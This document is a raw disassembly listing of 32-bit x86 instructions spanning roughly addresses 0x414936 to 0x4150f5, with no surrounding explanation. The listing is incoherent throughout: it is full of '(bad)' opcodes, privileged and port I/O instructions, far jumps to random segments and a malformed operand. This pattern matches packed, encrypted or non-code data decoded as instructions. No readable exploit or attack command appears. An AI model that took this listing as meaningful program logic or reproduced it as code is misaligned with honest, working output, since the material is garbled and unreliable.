  414936:	sbb    DWORD PTR [edi+ebp*8-0x4a4bc43],eax
  41493d:	sahf   
  41493e:	pop    ebx
  41493f:	(bad)  
  414940:	and    al,0x34
  414942:	mov    eax,ds:0xd3671871
  414947:	loope  0x41492e
  414949:	je     0x4149c7
  41494b:	mov    dh,0x6d
  41494d:	mov    eax,0x3a7bf509
  414952:	mov    cl,0xd
  414954:	cld    
  414955:	rol    DWORD PTR [ecx+0x27],0x37
  414959:	sub    ecx,edi
  41495b:	into   
  41495c:	add    eax,0xdf791eb
  414961:	xchg   ecx,eax
  414962:	nop
  414963:	jns    0x414938
  414965:	fld    QWORD PTR [edi-0x7c4222e7]
  41496b:	jne    0x414942
  41496d:	push   es
  41496e:	dec    edx
  41496f:	ss call 0x1889501a
  414975:	cmp    dh,BYTE PTR [edi-0x73]
  414978:	push   edi
  414979:	clc    
  41497a:	adc    dh,BYTE PTR [esi+0x7b]
  41497d:	sbb    cl,BYTE PTR [edx+0x62]
  414980:	rol    DWORD PTR ds:0x5c368430,cl
  414986:	pop    es
  414987:	cmp    DWORD PTR [ebp-0x1c],edx
  41498a:	jecxz  0x4149cc
  41498c:	pop    ds
  41498d:	(bad)  
  41498e:	and    al,0x12
  414990:	cmc    
  414991:	cld    
  414992:	fild   WORD PTR [esp+eiz*2-0x33f7c430]
  414999:	adc    al,0x3c
  41499b:	mov    ecx,0x9bac159b
  4149a0:	fyl2x  
  4149a2:	cmp    DWORD PTR [edx+0x6bfe4525],ebp
  4149a8:	jge    0x41495b
  4149aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149ab:	push   ds
  4149ac:	push   ss
  4149ad:	ret    0x4682
  4149b0:	ret    0xb9ae
  4149b3:	sahf   
  4149b4:	pop    ebx
  4149b5:	fadd   st,st(7)
  4149b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149b8:	cmp    al,0x22
  4149ba:	fucomip st,st(4)
  4149bc:	sbb    dl,cl
  4149be:	or     al,0x5d
  4149c0:	sbb    eax,0x982d752e
  4149c5:	jns    0x4149fc
  4149c7:	or     cl,bl
  4149c9:	les    edx,FWORD PTR [ebp+0x3]
  4149cc:	pusha  
  4149cd:	dec    edx
  4149ce:	jno    0x4149d3
  4149d0:	mov    ds:0x9948a70b,al
  4149d5:	sar    DWORD PTR [ebx-0x7b],1
  4149d8:	jne    0x414a05
  4149da:	aad    0x1
  4149dc:	not    DWORD PTR [eax+0x15]
  4149df:	jns    0x414a4b
  4149e1:	imul   esp,DWORD PTR [ebp+eiz*8-0x69],0xaee6b032
  4149e9:	push   ds
  4149ea:	js     0x414993
  4149ec:	lods   eax,DWORD PTR ds:[esi]
  4149ed:	xor    eax,0x2f42029
  4149f2:	mov    ebp,0x1e9f9470
  4149f7:	icebp  
  4149f8:	push   edi
  4149f9:	xchg   ecx,eax
  4149fa:	sti    
  4149fb:	cdq    
  4149fc:	sub    ebp,DWORD PTR [esi-0x2f]
  4149ff:	dec    edx
  414a00:	push   ebx
  414a01:	dec    ecx
  414a02:	loope  0x4149dd
  414a04:	jle    0x4149ed
  414a06:	xor    edx,DWORD PTR [ebx+0x4a]
  414a09:	jecxz  0x414a32
  414a0b:	xor    DWORD PTR [eax],edi
  414a0d:	pop    edi
  414a0e:	gs xchg edx,eax
  414a10:	jl     0x414a2b
  414a12:	xor    DWORD PTR [ebx],ebp
  414a14:	(bad)  
  414a15:	xchg   esp,eax
  414a16:	lods   eax,DWORD PTR ds:[esi]
  414a17:	imul   eax,DWORD PTR [ebx-0x32],0xffffff83
  414a1b:	pop    ds
  414a1c:	cmp    DWORD PTR [esi+0x3485f1fa],edx
  414a22:	arpl   si,bp
  414a24:	and    al,0x1b
  414a26:	pop    esp
  414a27:	sti    
  414a28:	int3   
  414a29:	icebp  
  414a2a:	sahf   
  414a2b:	fnsave [ecx]
  414a2d:	and    edi,ebp
  414a2f:	mov    cl,0xb9
  414a31:	xchg   ebp,eax
  414a32:	sub    ah,dl
  414a34:	aad    0x10
  414a36:	fst    QWORD PTR [ecx]
  414a38:	jne    0x4149f5
  414a3a:	or     eax,DWORD PTR [eax-0x85acc5e]
  414a40:	and    ebp,DWORD PTR [edi]
  414a42:	stos   BYTE PTR es:[edi],al
  414a43:	mov    dh,0xb0
  414a45:	addr16 or ah,bl
  414a48:	rol    BYTE PTR [edi-0x2b],cl
  414a4b:	mov    cs:0x1a40b947,al
  414a51:	cmc    
  414a52:	inc    ecx
  414a53:	dec    edx
  414a54:	cmp    BYTE PTR [ecx],0xf0
  414a57:	fild   QWORD PTR [ecx-0x1fb65b81]
  414a5d:	inc    esp
  414a5e:	fs clc 
  414a60:	mov    dl,0xea
  414a62:	mov    al,0xbb
  414a64:	cdq    
  414a65:	test   al,0xd6
  414a67:	adc    DWORD PTR [edi],eax
  414a69:	add    eax,0x2d4a3c1d
  414a6e:	push   ds
  414a6f:	fmul   st(4),st
  414a71:	push   ds
  414a72:	push   ds
  414a73:	cmc    
  414a74:	adc    eax,0xaebe0ae5
  414a79:	stc    
  414a7a:	clc    
  414a7b:	cdq    
  414a7c:	iret   
  414a7d:	xlat   BYTE PTR ds:[ebx]
  414a7e:	repnz or eax,ebx
  414a81:	call   0x12516708
  414a86:	pop    eax
  414a87:	or     eax,0x7c25138b
  414a8c:	mov    esp,0xcbd55114
  414a91:	lods   eax,DWORD PTR ds:[esi]
  414a92:	cmp    ecx,esp
  414a94:	stos   DWORD PTR es:[edi],eax
  414a95:	sub    edx,DWORD PTR [eax+0x5a]
  414a98:	es cld 
  414a9a:	sub    ebx,DWORD PTR [ebx]
  414a9c:	xor    al,0x35
  414a9e:	mov    edx,0x6168cfeb
  414aa3:	lock push cs
  414aa5:	(bad)  
  414aa6:	out    0xce,al
  414aa8:	popf   
  414aa9:	mov    esp,0xf086359c
  414aae:	sbb    eax,0xea7f6dc8
  414ab3:	call   0xc1813023
  414ab8:	mov    ecx,0xc560a65f
  414abd:	clc    
  414abe:	lods   al,BYTE PTR ds:[esi]
  414abf:	add    DWORD PTR [edi+0x2bba385b],0xd7c50c26
  414ac9:	cwde   
  414aca:	cmp    al,0xdc
  414acc:	loopne 0x414b15
  414ace:	(bad)  
  414acf:	pop    esi
  414ad0:	aam    0x89
  414ad2:	popa   
  414ad3:	adc    ecx,DWORD PTR [ebp+0x654f3134]
  414ad9:	or     DWORD PTR [eax],ebx
  414adb:	js     0x414b15
  414add:	rcl    BYTE PTR [eax],1
  414adf:	push   esp
  414ae1:	sti    
  414ae2:	dec    esp
  414ae3:	add    DWORD PTR ds:0x5b88bd4,ebp
  414ae9:	ins    DWORD PTR es:[edi],dx
  414aea:	cmp    eax,0xd040c8a5
  414aef:	sbb    BYTE PTR [eax],cl
  414af1:	mov    bh,0xf4
  414af3:	inc    ecx
  414af4:	js     0x414a86
  414af6:	nop
  414af7:	push   ecx
  414af8:	mov    ah,0x90
  414afa:	fwait
  414afb:	pop    esi
  414afc:	jne    0x414b54
  414afe:	test   BYTE PTR [ecx+ebp*2],0xb7
  414b02:	pop    ebp
  414b03:	sub    ecx,ebx
  414b05:	outs   dx,BYTE PTR ds:[esi]
  414b06:	mov    edi,edi
  414b08:	mov    esp,0x3fd93f1e
  414b0d:	test   BYTE PTR [ecx+esi*1+0x53],dl
  414b11:	sar    DWORD PTR [esi+0x39],1
  414b14:	xor    edx,0x68
  414b17:	add    BYTE PTR [edx],dh
  414b19:	js     0x414b7f
  414b1b:	iret   
  414b1c:	jmp    0xc92f:0x6595252
  414b23:	rcr    BYTE PTR [esp+edx*8-0x7d],0x2d
  414b28:	cwde   
  414b29:	xor    dl,ah
  414b2b:	(bad)  [ecx]
  414b2d:	sbb    ch,BYTE PTR [edi-0x6f]
  414b30:	pop    edi
  414b31:	cmp    BYTE PTR [edx-0x7d],dl
  414b34:	sub    eax,0xc72d3f20
  414b39:	fdivrp st(3),st
  414b3b:	mov    eax,ds:0x7537fe33
  414b40:	cmp    bl,BYTE PTR [edi-0x124b9d14]
  414b46:	dec    edx
  414b47:	jmp    0x414b92
  414b49:	gs mov bh,bh
  414b4c:	mov    DWORD PTR [eax+0x73362f2e],ecx
  414b52:	imul   ebx,DWORD PTR [ebx+0x5],0xf247eaaf
  414b59:	pop    esi
  414b5a:	das    
  414b5b:	lea    esp,ds:0x41feb855
  414b61:	addr16 mov dl,0xae
  414b64:	aad    0x23
  414b66:	mov    eax,ds:0x9596efd1
  414b6b:	sbb    DWORD PTR [ecx],ebp
  414b6d:	push   ebx
  414b6e:	xchg   ebp,eax
  414b6f:	call   0xabdaa98c
  414b74:	dec    eax
  414b75:	clc    
  414b76:	fst    st(3)
  414b78:	or     ecx,edx
  414b7a:	lods   eax,DWORD PTR ds:[esi]
  414b7b:	jp     0x414b2e
  414b7d:	xor    al,0xcd
  414b7f:	sbb    DWORD PTR [eax-0x50],esi
  414b82:	sub    BYTE PTR [edx-0x6a5c62df],ch
  414b88:	sbb    dl,bh
  414b8a:	jno    0x414be7
  414b8c:	mov    dh,0xd
  414b8e:	mov    dl,0x60
  414b90:	lea    ebx,[esi]
  414b92:	(bad)  
  414b93:	xor    DWORD PTR [ebp-0x51],edi
  414b96:	add    eax,0x5b1aacef
  414b9b:	xchg   BYTE PTR [edi+0x26546481],al
  414ba1:	mov    fs,ebp
  414ba3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ba4:	fidiv  WORD PTR [eax+0x57f4212b]
  414baa:	popa   
  414bab:	gs mov esp,0x31aed49
  414bb1:	in     al,dx
  414bb2:	dec    ebx
  414bb3:	jmp    0xfb6a:0x4075b73f
  414bba:	clc    
  414bbb:	pop    es
  414bbc:	test   ch,bh
  414bbe:	inc    esp
  414bbf:	xchg   edi,eax
  414bc0:	call   0x3468bf10
  414bc5:	cmp    dh,ah
  414bc7:	(bad)  
  414bc8:	adc    ebx,eax
  414bca:	and    BYTE PTR [ebx+0x239f4724],cl
  414bd0:	loope  0x414c23
  414bd2:	xchg   edi,eax
  414bd3:	pop    es
  414bd4:	fwait
  414bd5:	sbb    eax,0xf4c88d1f
  414bda:	mov    cl,0xe3
  414bdc:	mov    dh,0x20
  414bde:	or     DWORD PTR [edi],0xffffffda
  414be1:	adc    DWORD PTR [ecx-0x4929ee87],ebp
  414be7:	in     eax,dx
  414be8:	or     eax,0xc1850e04
  414bed:	out    0xff,al
  414bef:	aam    0xbb
  414bf1:	mov    edx,0x50819403
  414bf6:	jnp    0x414c34
  414bf8:	aaa    
  414bf9:	mov    bl,0xd9
  414bfb:	(bad)  
  414bfc:	bound  esi,QWORD PTR [ebp+0x706bb657]
  414c02:	inc    eax
  414c03:	adc    DWORD PTR [ebx-0x206261dc],0xffffffcb
  414c0a:	push   es
  414c0b:	inc    ecx
  414c0c:	out    dx,eax
  414c0d:	mov    ebx,0xf3b569d4
  414c12:	xchg   esp,eax
  414c13:	stos   DWORD PTR es:[edi],eax
  414c14:	jno    0x414c73
  414c16:	jmp    0x2cca5844
  414c1b:	xchg   esi,eax
  414c1c:	push   cs
  414c1d:	sub    BYTE PTR [esi],0x71
  414c20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c21:	mov    al,0xd8
  414c23:	ins    DWORD PTR es:[edi],dx
  414c24:	add    eax,0x7509d42d
  414c29:	daa    
  414c2a:	xchg   ebx,eax
  414c2b:	fild   DWORD PTR [edx]
  414c2d:	out    0x7a,al
  414c2f:	lahf   
  414c30:	les    ebx,FWORD PTR [edi]
  414c32:	jg     0x414bf3
  414c34:	fcmovu st,st(7)
  414c36:	mov    eax,ds:0x78709318
  414c3b:	shr    DWORD PTR [edi],0x88
  414c3e:	mov    dh,0xd5
  414c40:	mov    cl,0x61
  414c42:	lods   eax,DWORD PTR ds:[esi]
  414c43:	mov    esp,0x25f79bb5
  414c48:	push   esp
  414c49:	dec    esp
  414c4a:	sbb    BYTE PTR [edi],bl
  414c4c:	xor    DWORD PTR [ebx],edx
  414c4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c4f:	in     al,dx
  414c50:	ror    DWORD PTR [edx+0xe1e4572],cl
  414c56:	stos   DWORD PTR es:[edi],eax
  414c57:	nop
  414c58:	stc    
  414c59:	repnz mov ah,0xbe
  414c5c:	loopne 0x414c61
  414c5e:	push   ebx
  414c5f:	loopne 0x414bf5
  414c61:	in     eax,dx
  414c62:	mov    ah,bh
  414c64:	sub    eax,edx
  414c66:	push   ecx
  414c67:	pop    ebx
  414c68:	jbe    0x414c25
  414c6a:	ja     0x414cb2
  414c6c:	sbb    eax,0xc806a46f
  414c71:	xchg   ebp,eax
  414c72:	out    0xcb,eax
  414c74:	enter  0x6149,0x1b
  414c78:	push   cs
  414c79:	in     eax,dx
  414c7a:	pop    ss
  414c7b:	mov    ?,ebx
  414c7d:	or     DWORD PTR [ecx+0x6e],edx
  414c80:	lods   al,BYTE PTR ds:[esi]
  414c81:	dec    ebp
  414c82:	lahf   
  414c83:	push   edx
  414c84:	mov    ecx,DWORD PTR [bp+di-0x1550]
  414c89:	arpl   WORD PTR [edx+0x74],bp
  414c8c:	or     BYTE PTR [eax],ah
  414c8e:	nop
  414c8f:	ins    DWORD PTR es:[edi],dx
  414c90:	mov    eax,0xf5c1f99e
  414c95:	pop    ds
  414c96:	push   esi
  414c97:	into   
  414c98:	cwde   
  414c99:	add    eax,0x2b867a02
  414c9e:	pusha  
  414c9f:	or     BYTE PTR [eax-0x66],0x60
  414ca3:	or     al,0xca
  414ca5:	mov    dl,0x67
  414ca7:	push   edi
  414ca8:	mov    ds:0x13b06f9b,eax
  414cad:	xlat   BYTE PTR ds:[ebx]
  414cae:	je     0x414caa
  414cb0:	aaa    
  414cb1:	sbb    ecx,DWORD PTR [esi+0x3bc6f889]
  414cb7:	dec    edi
  414cb8:	jg     0x414c94
  414cba:	inc    ecx
  414cbb:	sbb    al,0xa1
  414cbd:	sti    
  414cbe:	xchg   esi,eax
  414cbf:	(bad)  
  414cc1:	mov    edx,0x8f57c87b
  414cc6:	sbb    al,0xb8
  414cc8:	rcl    BYTE PTR [edi],cl
  414cca:	fdiv   DWORD PTR [eax+0x28]
  414ccd:	pusha  
  414cce:	mov    fs,eax
  414cd0:	lock xchg BYTE PTR [ebx+0x17b55a3a],dh
  414cd7:	and    BYTE PTR [ecx],ch
  414cd9:	inc    edx
  414cda:	fst    QWORD PTR [edx]
  414cdc:	retf   0xcb63
  414cdf:	shl    DWORD PTR [ebx+eiz*2+0x78713494],1
  414ce6:	inc    ebp
  414ce7:	adc    BYTE PTR [ecx-0x71],0x5f
  414ceb:	and    edi,DWORD PTR [ebx]
  414ced:	(bad)  
  414cee:	(bad)  
  414cef:	mov    ebx,0xd4a1512c
  414cf4:	sbb    esp,DWORD PTR [esi]
  414cf6:	xor    BYTE PTR [esi-0x65],ch
  414cf9:	mov    DWORD PTR [ebx-0x3e],ecx
  414cfc:	repnz lods eax,DWORD PTR ds:[esi]
  414cfe:	mov    edi,0x86ce3296
  414d03:	or     DWORD PTR [edx],esi
  414d05:	mov    ecx,0x8187be04
  414d0a:	mov    ecx,0x74599e40
  414d0f:	nop
  414d10:	test   eax,0xe3adbf40
  414d15:	ds jmp 0x258e:0xc2911642
  414d1d:	mov    BYTE PTR [ebx+esi*2-0x1e],bl
  414d21:	in     al,dx
  414d22:	fisubr WORD PTR [ebx+0x71]
  414d25:	xchg   ebx,eax
  414d26:	add    bl,BYTE PTR [edi+0x3898ab01]
  414d2c:	stc    
  414d2d:	sahf   
  414d2e:	les    eax,FWORD PTR [edi-0x6429863e]
  414d34:	js     0x414d47
  414d36:	add    al,0xc5
  414d38:	mov    ebp,0x84324946
  414d3d:	loope  0x414dbb
  414d3f:	cmp    eax,0x53740c9f
  414d44:	jg     0x414cdf
  414d46:	daa    
  414d47:	nop
  414d48:	sahf   
  414d49:	(bad)  
  414d4a:	mov    ebp,0xd0461e96
  414d4f:	test   DWORD PTR [eiz*2-0xbd89278],ebx
  414d56:	(bad)  
  414d57:	cld    
  414d58:	call   0x49ef:0xad3925d2
  414d5f:	shr    DWORD PTR ds:0xef01834d,0x20
  414d66:	scas   eax,DWORD PTR es:[edi]
  414d67:	add    ebp,DWORD PTR [edi]
  414d69:	xor    bl,al
  414d6b:	js     0x414d08
  414d6d:	adc    BYTE PTR [eax-0x1b263132],ah
  414d73:	pause  
  414d75:	lods   al,BYTE PTR ds:[esi]
  414d76:	and    al,0xea
  414d78:	jmp    0x2bf50c46
  414d7d:	xchg   BYTE PTR gs:[ecx-0x65],ah
  414d81:	pop    ebx
  414d82:	adc    ch,0xb0
  414d85:	sar    DWORD PTR [edx-0x8],1
  414d88:	jge    0x414d2f
  414d8a:	mov    BYTE PTR [esi],dh
  414d8c:	imul   ecx,DWORD PTR [eax],0xd719c1a9
  414d92:	test   bh,dh
  414d94:	mov    esp,DWORD PTR [eax+0x38]
  414d97:	imul   ebx,DWORD PTR [esi+ebx*2-0x20],0x6
  414d9c:	call   0xfcb19e20
  414da1:	pushf  
  414da2:	and    BYTE PTR [ecx+ecx*2],dl
  414da5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414da6:	imul   esi,DWORD PTR [eax+0x19d773b0],0x5b0a587a
  414db0:	imul   ebp,eax,0xffffffe0
  414db3:	fmul   DWORD PTR [eax+0x56784076]
  414db9:	dec    edi
  414dba:	ret    
  414dbb:	push   ebx
  414dbc:	ins    BYTE PTR es:[edi],dx
  414dbd:	popa   
  414dbe:	sub    ah,BYTE PTR [edx]
  414dc0:	shl    DWORD PTR [eax-0x2526eb65],1
  414dc6:	mov    dl,0xc4
  414dc8:	mov    BYTE PTR ds:0xaa0518e9,al
  414dce:	inc    eax
  414dcf:	cmp    al,0x6
  414dd1:	rol    cl,cl
  414dd3:	jge    0x414e15
  414dd5:	fidiv  WORD PTR [ecx]
  414dd7:	add    DWORD PTR [edi],edx
  414dd9:	pop    esi
  414dda:	adc    ch,bl
  414ddc:	dec    esp
  414ddd:	and    DWORD PTR [ebp+esi*8-0x60],0xda56e059
  414de5:	and    dl,dl
  414de7:	sub    eax,DWORD PTR ds:0x7dde3f42
  414ded:	pop    ebx
  414dee:	jmp    0xda2f:0x14605905
  414df5:	pop    ecx
  414df6:	ins    DWORD PTR es:[edi],dx
  414df7:	push   esi
  414df8:	in     eax,0xd4
  414dfa:	mov    al,0x5c
  414dfc:	cmp    esi,DWORD PTR [ecx*1+0x1daf0973]
  414e03:	adc    DWORD PTR [eax],edi
  414e05:	std    
  414e06:	jns    0x414e2c
  414e08:	rcl    DWORD PTR [esi-0x2b],cl
  414e0b:	retf   
  414e0c:	push   es
  414e0d:	sbb    cl,BYTE PTR [edx-0x31]
  414e10:	popf   
  414e11:	and    eax,0x9eb12f68
  414e16:	aam    0x88
  414e18:	push   ss
  414e19:	and    ebx,DWORD PTR [eax+ebp*4+0x6d]
  414e1d:	ins    BYTE PTR es:[edi],dx
  414e1e:	cmp    eax,0x7cfc5355
  414e23:	pop    es
  414e24:	not    BYTE PTR [edx-0x20]
  414e27:	xor    DWORD PTR [edx+edi*4+0xc36a39d],edx
  414e2e:	push   ebp
  414e2f:	nop
  414e30:	data16 ins BYTE PTR es:[edi],dx
  414e32:	arpl   WORD PTR [ebx-0x4d63cd5f],cx
  414e38:	leave  
  414e39:	jge    0x414dc5
  414e3b:	sbb    eax,0x173c9572
  414e40:	rep outs dx,DWORD PTR ds:[esi]
  414e42:	mov    ds:0x8f4c24a6,al
  414e47:	jne    0x414e12
  414e49:	pop    esi
  414e4a:	sbb    DWORD PTR [edx+0x29d6accc],esp
  414e50:	fcmovnbe st,st(2)
  414e52:	jp     0x414e79
  414e54:	xor    BYTE PTR [esi-0x24112292],bl
  414e5a:	fiadd  DWORD PTR [ebp+0x32]
  414e5d:	fnstsw WORD PTR [edi+0x6c947e20]
  414e63:	mov    esi,0xb99a9507
  414e68:	sbb    al,al
  414e6a:	sbb    eax,0xf6f45e53
  414e6f:	cli    
  414e70:	popf   
  414e71:	shl    DWORD PTR ds:0x98c9a76e,cl
  414e77:	sub    al,0xc9
  414e79:	push   ebx
  414e7a:	jae    0x414ebd
  414e7c:	lods   al,BYTE PTR ds:[esi]
  414e7d:	popa   
  414e7e:	out    dx,al
  414e7f:	mov    dl,0x3f
  414e81:	(bad)  
  414e82:	stos   DWORD PTR es:[edi],eax
  414e83:	xor    ecx,DWORD PTR [edi-0x6e1ec0b5]
  414e89:	pop    ecx
  414e8a:	inc    eax
  414e8b:	sbb    al,0xbf
  414e8d:	ins    BYTE PTR es:[edi],dx
  414e8e:	push   0xbf94e3a7
  414e93:	int    0xf9
  414e95:	out    0xc0,al
  414e97:	dec    edx
  414e98:	mov    esi,ebp
  414e9a:	cld    
  414e9b:	and    BYTE PTR [esi],dl
  414e9d:	xchg   ebp,eax
  414e9e:	jmp    0x33cc:0x2ef78625
  414ea5:	retf   0x1027
  414ea8:	mov    bl,0xe2
  414eaa:	ins    BYTE PTR es:[edi],dx
  414eab:	xchg   ecx,eax
  414eac:	xchg   edx,eax
  414ead:	or     al,0xf6
  414eaf:	jmp    0x9533:0xc32187a1
  414eb6:	dec    eax
  414eb8:	nop
  414eb9:	das    
  414eba:	mov    bl,0x81
  414ebc:	or     BYTE PTR [ebp-0x3],bh
  414ebf:	test   BYTE PTR [ebx],ch
  414ec1:	lock aas 
  414ec3:	xchg   edx,eax
  414ec4:	inc    esi
  414ec5:	mov    ah,0x67
  414ec7:	push   ss
  414ec8:	movlps xmm6,QWORD PTR [edi+0x6a]
  414ecc:	fnstenv [edx-0x56e06f5b]
  414ed2:	inc    ebx
  414ed3:	scas   al,BYTE PTR es:[edi]
  414ed4:	popf   
  414ed5:	jl     0x414f14
  414ed7:	jmp    0x384e:0xe397332f
  414ede:	scas   eax,DWORD PTR es:[edi]
  414edf:	and    al,0xf0
  414ee1:	leave  
  414ee2:	adc    al,0xb0
  414ee4:	xor    al,0x68
  414ee6:	xchg   ebp,eax
  414ee7:	fwait
  414ee8:	add    ah,BYTE PTR [esi]
  414eea:	or     BYTE PTR [edi],cl
  414eec:	inc    ebx
  414eed:	leave  
  414eee:	inc    ecx
  414eef:	dec    edx
  414ef0:	push   ebx
  414ef1:	sub    al,0x98
  414ef3:	out    dx,eax
  414ef4:	dec    esi
  414ef5:	or     ebp,esp
  414ef7:	xlat   BYTE PTR ds:[ebx]
  414ef8:	addr16 sub al,0x84
  414efb:	xor    ah,BYTE PTR [eax]
  414efd:	mov    ebp,0x367f7df0
  414f02:	in     eax,dx
  414f03:	sub    BYTE PTR ds:0xf0393b02,bl
  414f09:	into   
  414f0a:	mov    edi,0x3da42f9d
  414f0f:	cmp    eax,0xa9aad965
  414f14:	xor    ebx,eax
  414f16:	outs   dx,BYTE PTR ds:[esi]
  414f17:	add    BYTE PTR [edi],dh
  414f19:	dec    eax
  414f1a:	retf   
  414f1b:	mov    ch,0xc7
  414f1d:	(bad)  
  414f1e:	fcom   DWORD PTR [esi+0x6b5ab9d2]
  414f24:	out    dx,al
  414f25:	jbe    0x414ea7
  414f27:	js     0x414f35
  414f29:	popf   
  414f2a:	(bad)  
  414f2b:	hlt    
  414f2c:	mov    cl,0x2c
  414f2e:	adc    DWORD PTR [edx+0x5b],ebx
  414f31:	dec    esi
  414f32:	jg     0x414f57
  414f34:	fstp   QWORD PTR [ebx]
  414f36:	gs ret 
  414f38:	ss out dx,eax
  414f3a:	fdivr  QWORD PTR [ebp+eax*2-0x3850fdde]
  414f41:	xchg   ecx,eax
  414f42:	mov    edi,0x4368a235
  414f47:	push   es
  414f48:	push   ds
  414f49:	dec    ecx
  414f4a:	fs imul edx,esi,0x6c2af27d
  414f51:	xor    al,0x7d
  414f53:	jb     0x414f4c
  414f55:	in     eax,dx
  414f56:	mov    ebx,0x3c39f33d
  414f5b:	test   al,0x4d
  414f5d:	shl    BYTE PTR [edi+0x25],cl
  414f60:	add    dl,dh
  414f62:	jnp    0x414f58
  414f64:	xor    DWORD PTR [edx-0x4a],ecx
  414f67:	and    BYTE PTR [eax],0x0
  414f6a:	imul   edi,DWORD PTR [esp+eax*8-0x213f23cb],0x4c
  414f72:	pusha  
  414f73:	scas   al,BYTE PTR es:[edi]
  414f74:	mov    ch,0x65
  414f76:	cwde   
  414f77:	mul    BYTE PTR [ecx]
  414f79:	sub    BYTE PTR [esi-0x589b65dc],bh
  414f7f:	add    esi,DWORD PTR [ebx]
  414f81:	mov    esp,0x9f9326c9
  414f86:	inc    eax
  414f87:	or     eax,0x8e7237f6
  414f8c:	add    edi,DWORD PTR [edi-0x612840dc]
  414f92:	add    al,0x13
  414f94:	jno    0x414fde
  414f96:	mov    al,0xdc
  414f98:	lock fild DWORD PTR [eax+0x582f2d5d]
  414f9f:	mov    ch,0xec
  414fa1:	aam    0x9e
  414fa3:	sub    edx,esi
  414fa5:	or     DWORD PTR [ecx+0x6384af95],ebp
  414fab:	sbb    BYTE PTR [edi-0x33231ee0],dl
  414fb1:	mov    dh,0x9
  414fb3:	mov    eax,ds:0x717c0dfc
  414fb8:	push   edi
  414fb9:	test   cl,dl
  414fbb:	xchg   ecx,eax
  414fbc:	mov    ch,0xa1
  414fbe:	xchg   edx,eax
  414fbf:	push   ss
  414fc0:	fcmovb st,st(1)
  414fc2:	dec    edi
  414fc3:	xchg   edx,ecx
  414fc5:	xchg   esi,eax
  414fc6:	push   edi
  414fc7:	out    dx,eax
  414fc8:	dec    eax
  414fc9:	jb     0x414fb9
  414fcb:	jae    0x414fbd
  414fcd:	scas   eax,DWORD PTR es:[edi]
  414fce:	test   eax,0x285c4aae
  414fd3:	xor    eax,0x10dce902
  414fd8:	bound  ebx,QWORD PTR [ebx+0x2ca2aa37]
  414fde:	pop    ebp
  414fdf:	sub    BYTE PTR [edx+esi*1],0x5e
  414fe3:	popa   
  414fe4:	xor    ch,BYTE PTR [esi+0x596a5dd9]
  414fea:	ins    BYTE PTR es:[edi],dx
  414feb:	loope  0x414fc6
  414fed:	out    dx,al
  414fee:	sbb    dh,BYTE PTR [esi+0x2666a17e]
  414ff4:	sub    bl,BYTE PTR [ebp+0x34]
  414ff7:	push   ds
  414ff8:	iret   
  414ff9:	cmp    esp,ebx
  414ffb:	je     0x415003
  414ffd:	fistp  QWORD PTR [ecx+0x15]
  415000:	xlat   BYTE PTR ds:[ebx]
  415001:	test   eax,ecx
  415003:	shl    DWORD PTR [ebp-0x782151ca],0x38
  41500a:	sbb    BYTE PTR [ebx-0x7d],0x7
  41500e:	je     0x415085
  415010:	push   edi
  415011:	jno    0x415067
  415013:	adc    BYTE PTR ds:0xb5089f05,ah
  415019:	xor    dl,BYTE PTR [eax+0x782b5c5f]
  41501f:	inc    esp
  415020:	addr16 mov edi,0x63bbad24
  415026:	lds    ecx,FWORD PTR [ebx+0x26d5b674]
  41502c:	stc    
  41502d:	(bad)  
  41502e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41502f:	hlt    
  415030:	xchg   edi,eax
  415031:	add    DWORD PTR [ebp+0x69],eax
  415034:	push   edi
  415035:	mov    WORD PTR [eax+0x1c],gs
  415038:	hlt    
  415039:	and    eax,0xc360f66
  41503e:	adc    eax,DWORD PTR [edi]
  415040:	jg     0x4150ad
  415042:	in     al,dx
  415043:	xchg   esp,eax
  415044:	stos   DWORD PTR es:[edi],eax
  415045:	mov    al,ds:0x6dab854b
  41504a:	inc    ebx
  41504b:	mov    edx,0xea8e006e
  415050:	jecxz  0x4150bc
  415052:	aad    0xf3
  415054:	adc    al,0x48
  415056:	popf   
  415057:	icebp  
  415058:	mov    al,ds:0x718dc63b
  41505d:	xor    DWORD PTR [edx-0x60],esp
  415060:	jmp    0x605eedf5
  415065:	aam    0x53
  415067:	sbb    DWORD PTR [esi+0x58cad44a],0x60
  41506e:	stos   BYTE PTR es:[edi],al
  41506f:	lock mov esi,0x5b5847d7
  415075:	xchg   ebp,eax
  415076:	mov    cl,BYTE PTR ds:0xec732bbb
  41507c:	inc    eax
  41507d:	xchg   bl,bh
  41507f:	jmp    0x41503c
  415081:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415082:	xor    al,0xe7
  415084:	mov    ebx,DWORD PTR [edi-0x4f]
  415087:	ins    DWORD PTR es:[edi],dx
  415088:	(bad)  
  415089:	mov    cl,0x42
  41508b:	imul   esp,DWORD PTR [ebx+0x2f03f317],0x55656103
  415095:	ss push ebx
  415097:	xor    BYTE PTR [eax],cl
  415099:	rol    BYTE PTR ds:0xd4df8894,cl
  41509f:	nop
  4150a0:	pop    es
  4150a1:	lahf   
  4150a2:	adc    eax,0x577a347c
  4150a7:	push   0x64
  4150a9:	push   edi
  4150aa:	syscall 
  4150ac:	fs push cs
  4150ae:	dec    ebp
  4150af:	jno    0x4150b4
  4150b1:	lods   al,BYTE PTR ds:[esi]
  4150b2:	pop    ss
  4150b3:	mov    ebx,0xf149fc18
  4150b8:	cld    
  4150b9:	and    BYTE PTR [ebx-0x5c552960],ch
  4150bf:	fbstp  TBYTE PTR [ebx]
  4150c1:	inc    ecx
  4150c2:	mov    eax,0x98afae6c
  4150c7:	(bad)  
  4150c8:	cmp    BYTE PTR [edi-0x41474ff5],dl
  4150ce:	cmp    bl,BYTE PTR [edi+eiz*1-0x5]
  4150d2:	je     0x4150dc
  4150d4:	or     cl,ch
  4150d6:	jmp    0x8699:0xb128786c
  4150dd:	je     0x4150eb
  4150df:	pop    ss
  4150e0:	inc    edx
  4150e1:	mov    edi,0x14f96db9
  4150e6:	push   0xffffff82
  4150e8:	jne    0x41510a
  4150ea:	xor    BYTE PTR [eax+edi*4+0x37a047a4],al
  4150f1:	push   esp
  4150f2:	push   ebp
  4150f3:	add    al,0xb9
  4150f5:	ret    
